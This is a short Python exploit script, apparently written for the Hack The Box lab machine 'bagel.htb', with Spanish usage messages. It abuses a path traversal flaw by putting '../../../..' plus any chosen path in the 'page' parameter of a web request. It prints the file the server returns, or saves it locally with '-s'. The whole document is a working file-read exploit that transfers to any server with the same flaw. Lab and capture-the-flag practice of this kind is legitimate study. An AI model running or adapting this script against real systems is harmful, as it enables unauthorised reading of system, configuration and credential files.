#!/usr/bin/python3
import requests, sys

if len(sys.argv) < 2:
    print(f"\n\033[0;37m[\033[0;31m-\033[0;37m] Uso: python3 {sys.argv[0]} <file>\n")
    print(f"\033[0;37m[\033[0;34m*\033[0;37m] Puede usar -s para guardar el archivo\n")
    sys.exit(1)

target = "http://bagel.htb:8000/"
params = {"page": f"../../../..{sys.argv[1]}"}
request = requests.get(target, params=params)

if len(sys.argv) > 2 and sys.argv[2] == "-s":
    output = sys.argv[1].split("/")[-1].strip()

    with open(output, "wb") as file:
        file.write(request.content)
        print(f"\n\033[0;37m[\033[0;34m*\033[0;37m] Archivo {output} guardado\n")
else:
    print(request.text.strip())
